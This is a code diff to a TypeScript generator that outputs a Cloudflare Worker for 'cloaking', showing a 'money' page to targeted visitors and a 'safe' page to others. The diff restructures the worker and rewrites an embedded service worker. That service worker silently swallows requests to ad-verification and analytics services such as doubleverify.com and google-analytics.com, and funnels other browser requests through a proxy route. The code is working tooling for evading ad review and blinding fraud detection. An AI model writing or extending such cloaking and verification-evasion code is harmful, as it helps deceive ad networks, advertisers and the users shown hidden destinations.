@@ -747,8 +747,6 @@ export function generateJciWorkerScript(options: {
 // This is the main worker script. It combines the advanced proxy engine with the hybrid cloaking logic.
 
 // --- CONFIGURATION ---
-// API Key for proxycheck.io - Set in Cloudflare Worker environment variables
-
 // Target Countries - Allowed countries for real traffic (country codes)
 const TARGET_COUNTRIES = ${JSON.stringify(targetCountryCodes)};
 
@@ -757,43 +755,13 @@ const MONEY_URL = '${moneyUrl}';
 const SAFE_URL = '${safePageUrl}';
 // --- END CONFIGURATION ---
 
-addEventListener('fetch', event => {
-  event.respondWith(handleRequest(event.request, event.env));
-});
+export default {
+  async fetch(request, env) {
+    const url = new URL(request.url);
 
-async function handleRequest(request, env) {
-  const url = new URL(request.url);
-
-  // ROUTE 1: Serve the service worker script itself when the browser requests it.
-  if (url.pathname === '/service-worker.js') {
-      const swCode = \`const TRACKER_BLACKLIST = [
-  // Expanded list of common trackers to neutralize
-  'doubleverify.com', 'analytics.optidigital.com', 'google-analytics.com', 
-  'googletagmanager.com', 'scorecardresearch.com', 'adnxs.com', 
-  'rubiconproject.com', 'krxd.net', 'criteo.com', 'pubmatic.com'
-];
-
-self.addEventListener('fetch', event => {
-  const request = event.request;
-  const url = new URL(request.url);
-
-  // If the request is already trying to access our proxy, let it pass through to prevent loops.
-  if (url.pathname.startsWith('/proxy-resource/')) {
-    return;
-  }
-  
-  // RULE 1: Neutralize keepalive beacons and blacklisted trackers cleanly.
-  if (request.keepalive || TRACKER_BLACKLIST.some(tracker => url.hostname.includes(tracker))) {
-    // Respond with "204 No Content" to successfully "eat" the request without error.
-    return event.respondWith(new Response(null, { status: 204 }));
-  }
-
-  // RULE 2: For all other outgoing requests, proxy them using a relative path.
-  // This removes the need for \\\`self.location\\\` and fixes the TypeScript error.
-  const proxyUrl = \\\`/proxy-resource/\\\${encodeURIComponent(url.href)}\\\`;
-  
-  event.respondWith(fetch(proxyUrl, request));
-});\`;
+    // ROUTE 1: Serve the service worker script itself when the browser requests it.
+    if (url.pathname === '/service-worker.js') {
+      const swCode = \`const TRACKER_BLACKLIST = ['doubleverify.com', 'analytics.optidigital.com', 'google-analytics.com']; self.addEventListener('fetch', event => { const request = event.request; const url = new URL(request.url); const selfOrigin = self.registration.scope; if (new URL(selfOrigin).origin === url.origin) return; if (request.keepalive) { event.respondWith(new Response(null, { status: 204 })); return; } if (TRACKER_BLACKLIST.some(tracker => url.hostname.includes(tracker))) { event.respondWith(new Response(null, { status: 204 })); return; } const proxyUrl = \\\`\\\${selfOrigin}proxy-resource/\\\${encodeURIComponent(url.href)}\\\`; const newRequest = new Request(request); event.respondWith(fetch(proxyUrl, newRequest)); });\`;
       return new Response(swCode, { headers: { 'Content-Type': 'application/javascript' } });
     }
 
@@ -804,7 +772,8 @@ self.addEventListener('fetch', event => {
     
     // ROUTE 3: Handle the initial page load with cloaking logic.
     return handleMainRequest(request, env);
-}
+  }
+};
 
 // --- CORE FUNCTIONS ---
 
